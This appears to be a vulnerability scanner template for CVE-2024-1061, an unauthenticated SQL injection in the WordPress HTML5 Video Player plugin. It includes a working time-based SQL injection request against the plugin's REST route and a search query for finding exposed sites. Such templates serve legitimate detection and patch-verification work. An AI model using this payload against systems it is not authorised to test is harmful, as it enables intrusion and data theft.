id: CVE-2024-1061

info:
  name: WordPress HTML5 Video Player - Unauthenticated SQL Injection
  author: xxcdd
  severity: high
  description: |
    WordPress HTML5 Video Player plugin is vulnerable to SQL injection. An unauthenticated attacker can exploit this vulnerability to perform SQL injection attacks.
  impact: |
    Successful exploitation of this vulnerability could allow an attacker to perform SQL injection attacks, potentially leading to unauthorized access, data leakage, or further compromise of the WordPress site.
  remediation: |
    Vendor did not acknowledge vulnerability but the issue seems to have been fixed in version 2.5.25.
  reference:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-1061
    - https://www.tenable.com/security/research/tra-2024-02
    - https://wordpress.org/plugins/html5-video-player
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cve-id: CVE-2024-1061
    cwe-id: CWE-89
  metadata:
    fofa-query: '"wordpress" && body="html5-video-player"'
    tags: cve,cve2024,wordpress,wp-plugin,sqli,unauth,html5-video-player

http:
  - raw:
      - |
        GET /?rest_route=/h5vp/v1/view/1&id=1'+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)--+- HTTP/1.1
        Host: {{Hostname}}
        Connection: close

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "video_id")'
          - 'duration>=5'
        condition: and
